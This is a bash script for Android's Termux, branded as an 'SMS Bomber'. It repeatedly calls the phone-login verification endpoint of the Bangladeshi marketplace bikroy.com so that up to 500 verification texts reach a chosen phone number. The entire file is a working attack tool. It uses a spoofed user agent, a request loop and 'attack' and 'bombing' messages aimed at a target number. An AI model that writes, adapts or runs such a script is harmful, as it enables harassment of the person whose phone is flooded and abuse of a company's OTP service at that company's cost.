#!/data/data/com.termux/files/usr/bin/bash

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Animation function
animate() {
    local text="$1"
    local delay=0.1
    for ((i=0; i<${#text}; i++)); do
        printf "%s" "${text:$i:1}"
        sleep $delay
    done
    echo ""
}

# Banner
banner() {
    clear
    echo -e "${RED}"
    echo "  ██████╗██╗  ██╗██████╗  █████╗ ████████╗███████╗██╗   ██╗"
    echo "██╔════╝██║  ██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║   ██║"
    echo "██║     ███████║██████╔╝███████║   ██║   █████╗  ██║   ██║"
    echo "██║     ██╔══██║██╔══██╗██╔══██║   ██║   ██╔══╝  ██║   ██║"
    echo "╚██████╗██║  ██║██████╔╝██║  ██║   ██║   ███████╗╚██████╔╝"
    echo " ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ${NC}"
    echo -e "${CYAN}              Termux SMS Bomber - Bikroy API${NC}"
    echo -e "${YELLOW}                        v1.0${NC}\n"
}

# API function
send_sms() {
    local phone="$1"
    local count=0
    local total="$2"
    
    while [ $count -lt $total ]; do
        ((count++))
        echo -ne "${YELLOW}Sending SMS $count/$total... ${NC}"
        
        response=$(curl -s -X POST "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone" \
            -H "User-Agent: Mozilla/5.0 (Linux; Android 10)" \
            -H "Content-Type: application/json" \
            -d '{"phone":"'"$phone"'"}' \
            --connect-timeout 10 --max-time 30)
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓]${NC}"
        else
            echo -e "${RED}[✗]${NC}"
        fi
        
        # Progress animation
        if [ $((count % 5)) -eq 0 ]; then
            echo -e "${PURPLE}[$(printf '█%.0s' $(seq 1 $((count*20/total))))] ${count}/${total} ${NC}\n"
        fi
        
        sleep 1.5  # Delay between requests
    done
    
    echo -e "${GREEN}🎉 Bombing completed! Sent $total SMS to $phone ${NC}"
}

# Main function
main() {
    banner
    
    echo -e "${BLUE}Enter target details:${NC}"
    read -p "📱 Phone Number (e.g., 01XXXXXXXXX): " phone
    read -p "💣 Amount of SMS (1-500): " amount
    
    # Validation
    if [[ ! "$phone" =~ ^01[3-9][0-9]{8}$ ]]; then
        echo -e "${RED}❌ Invalid phone number! Use Bangladesh format (01XXXXXXXXX)${NC}"
        exit 1
    fi
    
    if ! [[ "$amount" =~ ^[0-9]+$ ]] || [ "$amount" -lt 1 ] || [ "$amount" -gt 500 ]; then
        echo -e "${RED}❌ Invalid amount! Use 1-500${NC}"
        exit 1
    fi
    
    # Confirmation
    echo -e "\n${CYAN}🚀 Starting SMS bombing...${NC}"
    echo -e "${YELLOW}Target: ${GREEN}$phone${NC}"
    echo -e "${YELLOW}Amount: ${GREEN}$amount SMS${NC}\n"
    
    read -p "Press Enter to start or Ctrl+C to cancel..."
    
    # Start bombing with animation
    echo -e "\n${PURPLE}"
    animate "🔥 Initializing bomber..."
    animate "⚡ Connecting to Bikroy API..."
    animate "💥 Starting attack..."
    echo -e "${NC}"
    
    send_sms "$phone" "$amount"
}

# Trap Ctrl+C
trap 'echo -e "\n\n${RED}🛑 Attack stopped by user!${NC}"; exit 0' INT

# Check dependencies
if ! command -v curl &> /dev/null; then
    echo -e "${RED}❌ curl is not installed. Run: pkg install curl${NC}"
    exit 1
fi

main "$@"
